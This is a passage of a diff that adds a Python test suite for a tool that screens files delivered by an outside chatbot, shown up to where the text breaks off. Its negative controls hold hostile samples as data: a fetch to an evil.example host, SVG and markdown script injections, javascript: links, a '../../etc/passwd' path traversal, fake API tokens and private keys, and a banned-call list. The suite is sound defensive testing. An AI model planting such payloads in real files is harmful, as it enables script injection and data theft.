@@ -1,0 +1,486 @@
+"""Bridge ingest + job library (JOB 24, 2026-11-04): tools/bridge_ingest.py, tools/bridge_jobs_build.py, bridge/jobs.json, bridge_sync.suggest().
+
+  a. the job library: >= 40 jobs, every field, unique ids, every prompt carries the ONBOARD rules (only handoff/inbox/<id>/, no secrets, no bot / engine
+     edits, paper only, DONE.md, QUESTION.md), every category the owner listed is there, jobs.json is exactly what the generator writes
+  b. validation negative controls: a .js with fetch / eval / XHR / import() is rejected; secret-like strings (GitHub token, sk- key, private key,
+     key = value) are rejected; oversize files are rejected; disallowed types (html, py, exe, sh), fake images, bad JSON, SVG with a script or
+     an event handler are rejected; clean png / webp / svg / json / md / txt / small js are approved
+  c. a job folder: DONE.md decides 'done'; symlinks, hidden files, odd names, deep folders and too many files are handled; one bad file never hides the others
+  d. prepare: approved images are copied to olympus/assets/<id>/ with a manifest and an index; rejected files and scripts are never copied; the site copy has a budget
+  e. never executes: the ingest source has no exec / eval / compile / import of delivered files / subprocess
+  f. suggest(): the weekly rules (question first, in progress, first win, category of the week, gap, quick), at most 5, no duplicates, changes by week
+  g. JOB 13 (2026-11-04) the END-TO-END REHEARSAL with a fake ChatGPT, in a TEMP copy of the repo: three jobs picked from the library (money, research, content),
+     ChatGPT's answer files in handoff/inbox/<id>/, the ingest, status.json / SYNC.md, the 'Bridge: <name> done' hand-back, hostile / oversized / wrong-type files each
+     rejected with ONE plain sentence, nothing outside handoff/ written (a read-only run changes no byte; --apply writes only olympus/assets/), the real repo untouched
+    python -X utf8 -m tests.test_bridge_ingest
+"""
+from __future__ import annotations
+
+import datetime
+import json
+import os
+import re
+import shutil
+import struct
+import sys
+import tempfile
+import zlib
+
+ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+sys.path.insert(0, ROOT)
+from tools import bridge_ingest as I  # noqa: E402
+from tools import bridge_jobs_build as G  # noqa: E402
+from tools import bridge_sync as B  # noqa: E402
+
+RES = []
+TMPS = []
+
+
+def check(name, ok, info=""):
+    RES.append(bool(ok))
+    print(("[PASS] " if ok else "[FAIL] ") + name + ("" if ok else "  -> " + str(info)[:400]))
+
+
+def tmp():
+    d = tempfile.mkdtemp(prefix="le_ingest_")
+    TMPS.append(d)
+    return d
+
+
+def png(w=4, h=4):
+    def chunk(t, d):
+        c = struct.pack(">I", len(d)) + t + d
+        return c + struct.pack(">I", zlib.crc32(t + d) & 0xFFFFFFFF)
+    raw = b"".join(b"\x00" + b"\x7f\x20\xc0" * w for _ in range(h))
+    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0)) + chunk(b"IDAT", zlib.compress(raw)) + chunk(b"IEND", b"")
+
+
+def webp(w=8, h=6):
+    body = b"VP8X" + struct.pack("<I", 10) + b"\x00\x00\x00\x00" + (w - 1).to_bytes(3, "little") + (h - 1).to_bytes(3, "little")
+    return b"RIFF" + struct.pack("<I", 4 + len(body)) + b"WEBP" + body
+
+
+def put(d, rel, data):
+    p = os.path.join(d, *rel.split("/"))
+    os.makedirs(os.path.dirname(p), exist_ok=True)
+    with open(p, "wb") as fh:
+        fh.write(data if isinstance(data, bytes) else data.encode("utf-8"))
+    return p
+
+
+def ok_(name, data):
+    return I.validate_bytes(name, data)[0]
+
+
+def why_(name, data):
+    return I.validate_bytes(name, data)[1]
+
+
+def part_library():
+    doc = json.load(open(os.path.join(ROOT, "tools", "web_public", "bridge", "jobs.json"), encoding="utf-8"))
+    js = doc["jobs"]
+    ids = [j["id"] for j in js]
+    check("a. the library has at least 40 ready jobs, unique plain ids", len(js) >= 40 and len(set(ids)) == len(ids) and all(re.fullmatch(r"[a-z0-9][a-z0-9-]{0,60}", i) for i in ids), len(js))
+    need = {"id", "cat", "title", "makes", "tool", "prompt", "files", "lands", "minutes", "difficulty"}
+    check("a. every job has id, category, title, what it makes, the exact prompt, files, where it lands, minutes and difficulty",
+          all(need <= set(j) and j["title"] and j["makes"] and len(j["prompt"]) > 300 and isinstance(j["minutes"], int) and 1 <= j["minutes"] <= 60
+              and j["difficulty"] in ("easy", "medium", "hard") for j in js), [j["id"] for j in js if not need <= set(j)])
+    check("a. every job lands in handoff/inbox/<id>/ and lists DONE.md among its files", all(j["lands"] == f"handoff/inbox/{j['id']}/" and "DONE.md" in j["files"] and len(j["files"]) >= 2 for j in js))
+    rules = ["only add files under handoff/inbox/" + "{id}" + "/", "never edit the bots", "live_model*.json", "engine/", "no secrets", "paper trading only", "DONE.md", "QUESTION.md", "chatgpt/{id}"]
+    bad = [j["id"] for j in js if not all(r.replace("{id}", j["id"]).lower() in j["prompt"].lower() for r in rules)]
+    check("a. every prompt carries the ONBOARD rules (only handoff/inbox/<id>/, no bots / engine edits, no secrets, paper only, DONE.md, QUESTION.md)", not bad, bad[:5])
+    check("a. every prompt starts with its job id and names every file it expects", all(j["prompt"].startswith(f"Job {j['id']}.") and all(f in j["prompt"] for f in j["files"] if f != "DONE.md") for j in js))
+    cats = {c["id"] for c in doc["cats"]}
+    want = {"textures", "art", "logo", "sound", "copy", "lore", "obsidian", "strategy", "research", "fixtures", "docs", "mockup", "names"}
+    check("a. all 13 categories the owner listed exist and every category has at least 3 jobs", want <= cats and all(sum(1 for j in js if j["cat"] == c) >= 3 for c in want),
+          {c: sum(1 for j in js if j["cat"] == c) for c in want})
+    money = [j for j in js if j["cat"] == "money"]
+    mids = {j["id"] for j in money}
+    check("a. money and prop-firm jobs (>= 20): their own category, ids money-*, only .md / .json files back, each says how Claude ingests it (tools/bridge_ingest.py), where it lands, and fits the page's 400-character cap",
+          "money" in cats and len(money) >= 20 and all(i.startswith("money-") for i in mids) and all(j["ingest"].count("tools/bridge_ingest.py") == 1 and 40 < len(j["ingest"]) <= 400 for j in money)
+          and all(f.endswith((".md", ".json")) for j in money for f in j["files"]) and all(j["lands"] == f"handoff/inbox/{j['id']}/" for j in money), [j["id"] for j in money if "ingest" not in j])
+    bad_m = [j["id"] for j in money if not all(w in j["prompt"] for w in ("not financial, tax or legal advice", "UNVERIFIED", "Never ask me for passwords", "source", "ask a CPA", "paper only"))]
+    check("a. every money prompt: not financial / tax / legal advice, 'ask a CPA' for anything personal, official sources with dates, UNVERIFIED when unsure, never asks for secrets or personal ids, paper only", not bad_m, bad_m[:5])
+    tax = [j for j in money if any(w in j["id"] for w in ("tax", "business"))]
+    check("a. the tax jobs (set-aside, dependent, records, business setup) are framed as questions for a CPA for a US 18-year-old, never as a tax percentage",
+          len(tax) >= 4 and all("CPA" in j["prompt"] and "US" in j["prompt"] for j in tax) and "Do NOT give me a tax percentage" in next(j for j in tax if j["id"] == "money-tax-setaside")["prompt"], [j["id"] for j in tax])
+    check("a. the money topics asked for are all there: prop-firm comparison, discount codes, payout rules, tax set-aside, NQ news / session calendar, Kalshi fees and scan, content ideas",
+          all(any(w in i for i in mids) for w in ("prop-compare", "discount", "payout", "tax", "nq-events", "cme-holidays", "kalshi-fees", "kalshi-scan", "content")), sorted(mids))
+    text = " ".join(j["title"].lower() + " " + j["id"] for j in js)
+    check("a. the named textures (marble, gold, bronze, parchment, fire, water) are all in", all(w in text for w in ("marble", "gold", "bronze", "parchment", "fire", "water")))
+    check("a. research jobs ask for sources; fixtures jobs say synthetic; strategy jobs say text only / paper",
+          all("source" in j["prompt"].lower() for j in js if j["cat"] == "research") and all("synthetic" in j["prompt"].lower() or "fake" in j["prompt"].lower() for j in js if j["cat"] == "fixtures"))
+    check("a. no prompt holds a secret-looking string or a script ask (the library passes its own scanner)", not [j["id"] for j in js if I._first(I.SECRETS, j["prompt"])])
+    check("a. jobs.json is exactly what tools/bridge_jobs_build.py writes (edit the generator, not the file)",
+          open(os.path.join(ROOT, "tools", "web_public", "bridge", "jobs.json"), encoding="utf-8").read() == G.dumps(G.build()))
+    check("a. the library ids are part of the job total, and none collides with a card id", len(B.job_ids()) == len(set(B.job_ids())) and set(ids) <= set(B.job_ids()))
+
+
+def part_validate():
+    js_fetch = "const r = await fetch('https://evil.example/x');\nexport default r;"
+    check("b. NEGATIVE: a .js that calls fetch() is rejected", not ok_("a.js", js_fetch.encode()) and "fetch" in why_("a.js", js_fetch.encode()), why_("a.js", js_fetch.encode()))
+    bads = {"eval": "eval('1+1')", "XMLHttpRequest": "var x = new XMLHttpRequest();", "WebSocket": "new WebSocket('wss://a.b')", "import()": "import('./x.js')", "new Function": "new Function('return 1')",
+            "innerHTML": "el.innerHTML = '<b>x</b>'", "sendBeacon": "navigator.sendBeacon('/x', 'y')", "localStorage": "localStorage.setItem('a', 'b')", "a web address": "var u = 'https://x.y/z';",
+            "document.write": "document.write('x')", "string timer": "setTimeout('alert(1)', 5)", "require": "const fs = require('fs');"}
+    miss = [k for k, v in bads.items() if ok_("m.js", v.encode())]
+    check("b. NEGATIVE: scripts that eval, use XHR / WebSocket / import() / Function / innerHTML / beacons / storage / URLs / timers with text / require are all rejected", not miss, miss)
+    fakes = {"GitHub token": "token ghp_" + "a1B2c3D4e5" * 4, "sk key": "key: sk-" + "Ab1" * 12, "private key": "-----BEGIN RSA PRIVATE KEY-----\nMIIE\n-----END RSA PRIVATE KEY-----",
+             "key = value": "api_key = \"" + "x9Y8z7W6" * 3 + "\"", "AWS": "AKIA" + "ABCDEFGHIJKLMNOP", "Slack": "xoxb-1234567890-abcdefghij", "JWT": "eyJhbGciOiJIUzI1" + "." + "eyJzdWIiOiIxMjM0NTY3" + "." + "SflKxwRJSMeKKF2QT4fw",
+             "Telegram": "123456789:" + "AAH" + "x" * 32}
+    miss = [k for k, v in fakes.items() if ok_("n.md", v.encode())]
+    check("b. NEGATIVE: a secret-like string (GitHub token, sk- key, private key, key = value, AWS, Slack, JWT, Telegram) is rejected in md / txt / json / js / svg",
+          not miss and not any(ok_(n, ("x " + fakes["GitHub token"]).encode()) for n in ("a.md", "a.txt", "a.js", "a.svg")) and not ok_("a.json", json.dumps({"k": fakes["sk key"]}).encode()), miss)
+    check("b. a normal sentence about tokens / keys is fine (no false alarm on 'API key' as a word)", ok_("a.md", b"# Notes\nStore the API key in GitHub Secrets, never in the repo. A token is short-lived."))
+    big = {"a.png": png() + b"\0" * (5 * 1024 * 1024), "a.webp": webp() + b"\0" * (5 * 1024 * 1024), "a.svg": b"<svg>" + b"a" * (201 * 1024) + b"</svg>", "a.json": b"[" + b"1," * (600 * 1024) + b"1]",
+           "a.md": b"a" * (201 * 1024), "a.txt": b"a" * (201 * 1024), "a.js": b"var a=1;" * (13 * 1024)}
+    miss = [k for k, v in big.items() if ok_(k, v) or "too big" not in why_(k, v)]
+    check("b. NEGATIVE: oversize files are rejected per type (png / webp 5 MB, svg / md / txt 200 KB, json 1 MB, js 100 KB)", not miss, miss)
+    for name in ("a.html", "a.py", "a.exe", "a.sh", "a.bat", "a.ps1", "a.php", "a.zip", "a.pdf", "a.gif", "a.jpg", "a", "a.mjs", "a.jsx"):
+        if ok_(name, b"print(1)"):
+            check("b. NEGATIVE: file type is rejected: " + name, False)
+            break
+    else:
+        check("b. NEGATIVE: html, py, exe, sh, bat, ps1, php, zip, pdf, gif, jpg, mjs and extension-less files are rejected (only png / webp / svg / json / md / txt / js)", True)
+    check("b. NEGATIVE: a fake PNG (text named .png), a PNG with a wrong signature, a truncated WebP, a 20000 px PNG are rejected",
+          not ok_("a.png", b"hello world, not an image at all, just some text") and not ok_("a.png", b"\x89PNX\r\n\x1a\n" + png()[8:]) and not ok_("a.webp", b"RIFF\0\0\0\0WEBP") and not ok_("a.png", png(20000, 10)))
+    check("b. NEGATIVE: bad JSON, binary in a .txt, non UTF-8 and an empty file are rejected", not ok_("a.json", b"{not json") and not ok_("a.txt", b"ab\x00cd") and not ok_("a.md", b"\xff\xfe\xfa") and not ok_("a.md", b""))
+    svg_bad = ['<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', '<svg onload="x()"></svg>', '<svg><a href="javascript:alert(1)"><rect/></a></svg>',
+               '<svg><foreignObject><div/></foreignObject></svg>', '<svg><image href="https://evil.example/p.png"/></svg>', '<!DOCTYPE svg [<!ENTITY a "b">]><svg/>', '<svg><style>@import url(x.css);</style></svg>',
+               '<svg><use href="other.svg#a"/></svg>', "hello, not an svg"]
+    miss = [s[:30] for s in svg_bad if ok_("a.svg", s.encode())]
+    check("b. NEGATIVE: an SVG with a script, event handler, javascript:, foreignObject, external image, entity, @import, outside <use>, or no <svg> is rejected", not miss, miss)
+    md_bad = ["<script>alert(1)</script>", "[x](javascript:alert(1))", "<iframe src=x></iframe>"]
+    check("b. NEGATIVE: markdown with a script, javascript: link or iframe is rejected", not any(ok_("a.md", s.encode()) for s in md_bad))
+    good = {"a.png": png(), "a.webp": webp(), "a.svg": b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><circle cx="5" cy="5" r="4" fill="#f5c96a"/></svg>', "a.json": b'{"trades": [1, 2]}',
+            "a.md": b"# Title\n\n- one\n- two\n", "a.txt": b"plain words", "a.js": b"export const GODS = ['Zeus', 'Hera'];\nexport function pick(i) { return GODS[i % GODS.length]; }\n", "DONE.md": b"Made 4 maps. Wire nothing."}
+    miss = [k for k, v in good.items() if not ok_(k, v)]
+    check("c. CONTROL: clean png / webp / svg / json / md / txt / small js / DONE.md are approved (with size, hash and pixel size in the meta)", not miss
+          and I.validate_bytes("a.png", png(4, 4))[2].get("w") == 4 and I.validate_bytes("a.webp", webp(8, 6))[2].get("h") == 6 and len(I.validate_bytes("a.txt", b"x")[2]["sha256"]) == 64, miss)
+
+
+def part_scan():
+    inbox = tmp()
+    j = os.path.join(inbox, "tex-test")
+    put(j, "good.png", png())
+    put(j, "notes.md", "# Hello\n- a")
+    put(j, "evil.js", "fetch('https://x.y')")
+    put(j, "leak.txt", "ghp_" + "a1B2c3D4e5" * 4)
+    put(j, "page.html", "<h1>x</h1>")
+    put(j, ".hidden.png", png())
+    put(j, "bad name!.png", png())
+    put(j, "sub/inner.png", png())
+    put(j, "a/b/c/d/deep.png", png())
+    put(j, "DONE.md", "Made 1 png, wire as a skybox.")
+    try:
+        os.symlink("/etc/hostname", os.path.join(j, "link.txt"))
+    except OSError:
+        pass
+    put(inbox, "README.md", "not a folder")
+    put(os.path.join(inbox, "q-test"), "QUESTION.md", "Which size?")
+    put(os.path.join(inbox, "wip-test"), "a.png", png())
+    put(os.path.join(inbox, "Bad_Folder"), "DONE.md", "x")
+    res = I.scan(inbox)
+    r = res["tex-test"]
+    by = {f["name"]: f for f in r["files"]}
+    check("c. DONE.md = done; QUESTION.md = question; neither = in progress; files at the inbox root and oddly named folders are ignored",
+          r["state"] == "done" and res["q-test"]["state"] == "question" and res["wip-test"]["state"] == "in progress" and "README.md" not in res and "Bad_Folder" not in res, {k: v["state"] for k, v in res.items()})
+    check("c. one bad file never hides the others: good.png, notes.md, DONE.md and sub/inner.png approved", all(by[n]["ok"] for n in ("good.png", "notes.md", "DONE.md", "sub/inner.png")), {n: by[n] for n in by if not by[n]["ok"]})
+    check("c. NEGATIVE: evil.js (fetch), leak.txt (token), page.html, .hidden.png and 'bad name!.png' are each rejected with a reason",
+          all(not by[n]["ok"] and by[n]["reason"] for n in ("evil.js", "leak.txt", "page.html", ".hidden.png", "bad name!.png")), {n: by.get(n) for n in ("evil.js", "leak.txt", "page.html", ".hidden.png")})
+    check("c. a symlink is never followed (rejected), and a folder deeper than 3 levels is not read", ("link.txt" not in by or not by["link.txt"]["ok"]) and "a/b/c/d/deep.png" not in by, list(by))
+    check("c. counts: approved images / text count without DONE.md; rejected counted", r["approved"] == 3 and r["rejected"] >= 5, (r["approved"], r["rejected"]))
+    many = os.path.join(inbox, "many-files")
+    for i in range(I.MAX_FILES + 5):
+        put(many, f"f{i:03d}.txt", "x")
+    put(many, "DONE.md", "x")
+    rm = I.scan_job(many)
+    check("c. NEGATIVE: more than 80 files: only the first 80 are checked and the page is told", len(rm["files"]) <= I.MAX_FILES and any("limit" in s for s in rm["issues"]), rm["issues"])
+    rep = I.report(res)
+    check("c. the report names every rejected file with its reason", "REJECTED evil.js" in rep and "fetch" in rep and "REJECTED leak.txt" in rep)
+    d = I.deliveries(inbox, res)
+    dj = d["jobs"]["tex-test"]
+    check("c. deliveries(): only DONE jobs; images listed with size; text previews for md; a DONE line; rejects with reasons; nothing for question / in progress jobs",
+          set(d["jobs"]) == {"tex-test"} and {i["name"] for i in dj["images"]} >= {"good.png", "sub/inner.png"} and any(t["name"] == "notes.md" and "Hello" in t["text"] for t in dj["text"])
+          and "wire as a skybox" in dj["done"] and any(x["name"] == "evil.js" for x in dj["rejects"]), dj)
+    check("c. a rejected script's text never reaches the previews", not any("fetch" in t["text"] for t in dj["text"]) and not any("ghp_" in t["text"] for t in dj["text"]))
+    big = put(os.path.join(inbox, "big-test"), "huge.png", png() + b"\0" * (6 * 1024 * 1024))
+    put(os.path.join(inbox, "big-test"), "DONE.md", "x")
+    rb = I.scan_job(os.path.dirname(big))
+    check("c. NEGATIVE: an oversize file on disk is rejected without being read whole", not [f for f in rb["files"] if f["name"] == "huge.png"][0]["ok"] and "too big" in [f for f in rb["files"] if f["name"] == "huge.png"][0]["reason"])
+    return inbox, res
+
+
+def part_prepare(inbox, res):
+    assets = os.path.join(tmp(), "assets")
+    done = I.apply_assets(inbox, assets, res)
+    got = sorted(os.listdir(os.path.join(assets, "tex-test"))) if os.path.isdir(os.path.join(assets, "tex-test")) else []
+    check("d. approved images are copied to assets/<id>/ with a manifest.json; scripts, text, rejects and nested files are not", done.get("tex-test") == 1 and got == ["good.png", "manifest.json"], got)
+    man = json.load(open(os.path.join(assets, "tex-test", "manifest.json"), encoding="utf-8"))
+    check("d. the manifest has name, kind, size, sha256 and pixel size per image, plus the rejected list", man["id"] == "tex-test" and man["files"][0]["name"] == "good.png" and man["files"][0]["w"] == 4
+          and len(man["files"][0]["sha256"]) == 64 and any(r["name"] == "evil.js" for r in man["rejected"]), man)
+    idx = json.load(open(os.path.join(assets, "index.json"), encoding="utf-8"))
+    check("d. assets/index.json lists the jobs with images; a job with no approved image gets no folder; running twice is the same", idx["jobs"] == {"tex-test": 1} and not os.path.exists(os.path.join(assets, "q-test"))
+          and I.apply_assets(inbox, assets, res) == done)
+    site = os.path.join(tmp(), "site")
+    n = I.copy_for_site(site, inbox, res)
+    check("d. the site copy (thumbnails for the Deliveries tab) holds only approved top-level images of DONE jobs", n == 1 and os.listdir(os.path.join(site, "tex-test")) == ["good.png"], os.listdir(site) if os.path.isdir(site) else None)
+    n2 = I.copy_for_site(os.path.join(tmp(), "s2"), inbox, res, budget=10)
+    check("d. the site copy respects its size budget", n2 == 0)
+    # the page data: status.json + deliveries.json through bridge_sync.publish with a fake root
+    import pathlib
+    fake = pathlib.Path(tmp())
+    shutil.copytree(inbox, str(fake / "handoff" / "inbox"))
+    old = B.ROOT
+    B.ROOT = fake
+    try:
+        st = B.status()
+        out = tmp()
+        msg = B.publish(out)
+    finally:
+        B.ROOT = old
+    dl = json.load(open(os.path.join(out, "bridge", "deliveries.json"), encoding="utf-8"))
+    check("d. status.json lists the delivery (brief: counts, image names, text names, the DONE line); deliveries.json holds the previews", "tex-test" in st["deliveries"] and st["deliveries"]["tex-test"]["images"][:1] == ["good.png"]
+          and "text" not in st["deliveries"]["tex-test"] and dl["jobs"]["tex-test"]["text"], st["deliveries"])
+    check("d. publish() also copies the approved images next to the page (bridge/deliveries/<id>/) and says so",
+          os.path.exists(os.path.join(out, "bridge", "deliveries", "tex-test", "good.png")) and "delivered images" in msg, msg)
+    return fake
+
+
+def part_never_runs():
+    src = open(os.path.join(ROOT, "tools", "bridge_ingest.py"), encoding="utf-8").read()
+    code = "\n".join(l for l in src.splitlines() if not l.strip().startswith("#"))
+    code = re.sub(r'(?s)""".*?"""', "", code)
+    # the pattern lists name the dangerous words on purpose; look only outside the string patterns of the lists
+    body = re.sub(r"(?s)^(SECRETS|JS_BAD|SVG_BAD|MD_BAD) = \[.*?^\]|^MD_BAD = .*$", "", code, flags=re.M)
+    body = body.replace("re.compile(", "RECOMP(")          # regular expressions are fine; compiling code is not
+    bad = [w for w in ("exec(", "eval(", "compile(", "__import__", "importlib", "subprocess", "runpy", "os.system", "popen", "pickle", "marshal", "ctypes", "socket", "urllib", "requests", "webbrowser") if w in body]
+    check("e. the ingest never executes anything: no exec / eval / compile / importlib / subprocess / sockets / urllib in its code", not bad, bad)
+    check("e. it only reads bytes and text and copies bytes (shutil.copyfile), and rejects links", "shutil.copyfile" in src and "followlinks=False" in src and "islink" in src)
+    s = open(os.path.join(ROOT, "tools", "bridge_sync.py"), encoding="utf-8").read()
+    check("e. bridge_sync reaches the ingest only through its read-only functions (deliveries / copy_for_site), inside try / except", "_ingest().deliveries" in s and "_ingest().copy_for_site" in s)
+
+
+def part_suggest():
+    lib = B.library()
+    cats = [c["id"] for c in json.load(open(os.path.join(ROOT, "tools", "web_public", "bridge", "jobs.json"), encoding="utf-8"))["cats"]]
+    d1, d2 = datetime.date(2026, 11, 4), datetime.date(2026, 11, 11)
+    n1 = B.suggest({}, lib, d1, cats)
+    check("f. suggest(): at most 5, no duplicates, every item has title / why / minutes / difficulty / rule, all from the library", 1 <= len(n1) <= 5 and len({n["id"] for n in n1}) == len(n1)
+          and all(n["id"] in {j["id"] for j in lib} and n["title"] and n["why"] and n["rule"] in ("question", "finish", "first", "week", "gap", "quick") for n in n1), n1)
+    check("f. an empty inbox starts with the 'first' win (an easy job)", n1[0]["rule"] == "first" and n1[0]["difficulty"] == "easy", n1[0])
+    n2 = B.suggest({}, lib, d2, cats)
+    check("f. the category of the week changes with the week (rule 'week' picks differ between 2026-11-04 and 2026-11-11)", [n["id"] for n in n1 if n["rule"] == "week"] != [n["id"] for n in n2 if n["rule"] == "week"]
+          and B.suggest({}, lib, d1, cats) == n1, ([n["id"] for n in n1], [n["id"] for n in n2]))
+    ids = [j["id"] for j in lib]
+    jobs = {ids[0]: {"state": "question", "files": 0}, ids[1]: {"state": "in progress", "files": 2}, ids[2]: {"state": "done", "files": 3}}
+    n3 = B.suggest(jobs, lib, d1, cats)
+    check("f. a question comes first, then a job still in progress; a delivered job is never suggested again; no 'first' rule once something is delivered",
+          n3[0]["id"] == ids[0] and n3[0]["rule"] == "question" and n3[1]["id"] == ids[1] and n3[1]["rule"] == "finish" and ids[2] not in [n["id"] for n in n3] and all(n["rule"] != "first" for n in n3), n3)
+    alld = {j["id"]: {"state": "done", "files": 1} for j in lib}
+    check("f. everything delivered -> an empty list, not an error; an empty library -> an empty list", B.suggest(alld, lib, d1, cats) == [] and B.suggest({}, [], d1, cats) == [])
+    st = B.status()
+    check("f. status() carries 'next' (the same rules) and 'deliveries', and keeps the old keys and count names", isinstance(st["next"], list) and isinstance(st["deliveries"], dict)
+          and set(st["counts"]) == {"total", "done", "question", "in_progress", "files"} and st["counts"]["total"] == len(B.job_ids()), st["counts"])
+
+
+# ------------------------------------------------------------------------------------------------------------ g: the END-TO-END rehearsal with a fake ChatGPT (JOB 13, 2026-11-04)
+def tree_hash(root):
+    """{relative path: sha1} of every file under root (symlinks are hashed as their link text, never followed)"""
+    import hashlib
+    out = {}
+    for dp, dns, fns in os.walk(root, followlinks=False):
+        for fn in fns:
+            full = os.path.join(dp, fn)
+            rel = os.path.relpath(full, root).replace(os.sep, "/")
+            if os.path.islink(full):
+                out[rel] = "link:" + os.readlink(full)
+            else:
+                with open(full, "rb") as fh:
+                    out[rel] = hashlib.sha1(fh.read()).hexdigest()
+    return out
+
+
+def fake_chatgpt(inbox, job, with_done=True):
+    """What a ChatGPT that follows the job prompt would leave in handoff/inbox/<id>/: every file the prompt names, then DONE.md"""
+    d = os.path.join(inbox, job["id"])
+    os.makedirs(d, exist_ok=True)
+    for f in job["files"]:
+        if f == "DONE.md":
+            continue
+        if f.endswith(".md"):
+            body = f"# {job['title']}\n\n- Made for the owner (plain words).\n- Source: example.org, checked 2026-11-04.\n- UNVERIFIED items are marked.\n"
+        elif f.endswith(".json"):
+            body = json.dumps({"job": job["id"], "items": [{"name": "a"}, {"name": "b"}]})
+        elif f.endswith(".png"):
+            put(d, f, png(8, 8))
+            continue
+        else:
+            body = "plain text\n"
+        put(d, f, body)
+    if with_done:
+        put(d, "DONE.md", f"Made {job['title']}. Files: " + ", ".join(x for x in job["files"] if x != "DONE.md") + ". Nothing to wire.")
+    return d
+
+
+SAFE_SENTENCE = re.compile(r"^[A-Z][^\n]{15,200}[.)]$")
+JARGON = re.compile(r"fetch|eval|XMLHttpRequest|symlink|UTF|sha256|regex|base64|MIME|exploit|payload|sandbox|\bXSS\b|CSRF", re.I)
+
+
+def part_rehearsal():
+    import subprocess
+    py = [sys.executable, "-B", "-X", "utf8"]                      # -B: no .pyc files, so the rehearsal writes nothing but what the tools write
+    doc = json.load(open(os.path.join(ROOT, "tools", "web_public", "bridge", "jobs.json"), encoding="utf-8"))
+    lib = {j["id"]: j for j in doc["jobs"]}
+    money = sorted(j for j in lib if j == "money-risk-budget") or sorted(j for j in lib if lib[j]["cat"] == "money")
+    research = sorted(j for j in lib if lib[j]["cat"] == "research")
+    content = sorted(j for j in lib if "content" in j) or sorted(j for j in lib if lib[j]["cat"] == "copy")
+    picks = [money[0], research[0], content[0]]
+    check(f"g. rehearsal: three jobs picked from the library of {len(lib)} like the owner would: a money one ({picks[0]}), a research one ({picks[1]}), a content one ({picks[2]})", len({lib[i]['cat'] for i in picks}) >= 2 and len(set(picks)) == 3, picks)
+    # the real repo is never touched: hash the places the flow could write
+    real_places = [os.path.join(ROOT, "handoff"), os.path.join(ROOT, "tools", "web_public", "bridge"), os.path.join(ROOT, "tools", "web_public", "olympus", "assets")]
+    before = [tree_hash(d) for d in real_places]
+    # a TEMP copy of the repo: only the Bridge files (the scripts find their own root from where they live)
+    t = tmp()
+    os.makedirs(os.path.join(t, "tools", "web_public"))
+    shutil.copytree(os.path.join(ROOT, "handoff"), os.path.join(t, "handoff"))
+    for f in ("bridge_ingest.py", "bridge_sync.py", "bridge_jobs_build.py"):
+        shutil.copy(os.path.join(ROOT, "tools", f), os.path.join(t, "tools", f))
+    shutil.copytree(os.path.join(ROOT, "tools", "web_public", "bridge"), os.path.join(t, "tools", "web_public", "bridge"))
+    inbox = os.path.join(t, "handoff", "inbox")
+
+    def run(*a):
+        r = subprocess.run([*py, *a], cwd=t, capture_output=True, text=True, timeout=120)
+        return r.returncode, r.stdout + r.stderr
+
+    # 1. ChatGPT is working: files but no DONE.md yet
+    fake_chatgpt(inbox, lib[picks[0]], with_done=False)
+    rc, out = run("tools/bridge_ingest.py")
+    check("g. a job with files but no DONE.md is 'in progress' and the report says ChatGPT is not finished", rc == 0 and f"{picks[0]}: in progress" in out and "has not added DONE.md yet" in out, out)
+    # 2. ChatGPT finishes all three
+    for i in picks:
+        fake_chatgpt(inbox, lib[i])
+    snap = tree_hash(t)
+    rc, out = run("tools/bridge_ingest.py")
+    want = {i: len([f for f in lib[i]["files"] if f != "DONE.md"]) for i in picks}
+    check("g. the ingest report: each of the three jobs is done with every file approved and nothing rejected (counts from the library's file lists)",
+          rc == 0 and all(f"{i}: done, {want[i]} approved, 0 rejected" in out for i in picks) and "REJECTED" not in out, out)
+    check("g. the report run is READ-ONLY: not one byte of the whole temp copy changed", tree_hash(t) == snap)
+    # 3. status.json / SYNC.md refresh (what Claude runs): only the three expected files change
+    rc, out = run("tools/bridge_sync.py")
+    after = tree_hash(t)
+    changed = sorted(k for k in set(after) | set(snap) if after.get(k) != snap.get(k))
+    check("g. 'python tools/bridge_sync.py' writes only handoff/SYNC.md and bridge/status.json + deliveries.json, nothing else", rc == 0 and changed == ["handoff/SYNC.md", "tools/web_public/bridge/deliveries.json", "tools/web_public/bridge/status.json"], (rc, changed, out[-200:]))
+    st = json.load(open(os.path.join(t, "tools", "web_public", "bridge", "status.json"), encoding="utf-8"))
+    check("g. status.json now shows the three jobs done with their file counts, counts.done = 3, the 'next' list and the deliveries brief are there",
+          all(st["jobs"][i] == {"state": "done", "files": want[i]} for i in picks) and st["counts"]["done"] == 3 and st["counts"]["total"] == len(B.job_ids()) and len(st["next"]) <= 5 and set(picks) <= set(st["deliveries"]), st["jobs"])
+    sync = open(os.path.join(t, "handoff", "SYNC.md"), encoding="utf-8").read()
+    check("g. SYNC.md's AUTO block lists the three jobs as DONE and the hand-written part (the LINK WORD line, the rules) is untouched",
+          all(f"- {i}: DONE ({want[i] + 1} files)" in sync for i in picks) and re.search(r"^LINK WORD: [A-Z0-9]+$", sync, re.M) and "## ChatGPT section" in sync)
+    dl = json.load(open(os.path.join(t, "tools", "web_public", "bridge", "deliveries.json"), encoding="utf-8"))
+    check("g. deliveries.json (the page's Deliveries tab) carries each job's DONE line and its text, as plain text", all(dl["jobs"][i]["done"].startswith("Made ") and dl["jobs"][i]["approved"] == want[i] for i in picks))
+    # 4. the owner's hand-back text
+    msgs = [f"Bridge: {i} done" for i in picks]
+    outs = [run("tools/bridge_ingest.py", "--handback", m)[1].strip() for m in msgs]
+    check("g. 'Bridge: <name> done' works: Claude's hand-back reads each job back in one plain paragraph ('ChatGPT is done. N files passed the safety check.')",
+          all(o.startswith(f"{i}: ChatGPT is done. {want[i]} file") and "passed the safety check." in o for i, o in zip(picks, outs)), outs)
+    pr = [I.parse_handback(x) for x in ("bridge: Money-Risk-Budget DONE.", "  Bridge :  res-prop-rules   done  ", "Hi Claude! Bridge: copy-tooltips done, thanks", "Bridge: icons question", "Bridge: ../../etc/passwd done", "Bridge: a/b done", "done", "", "Bridge: x done" + "y" * 90)]
+    check("g. the hand-back line is forgiving about capitals, spaces, a full stop and words around it, and never accepts a path (../, slashes) or a long id",
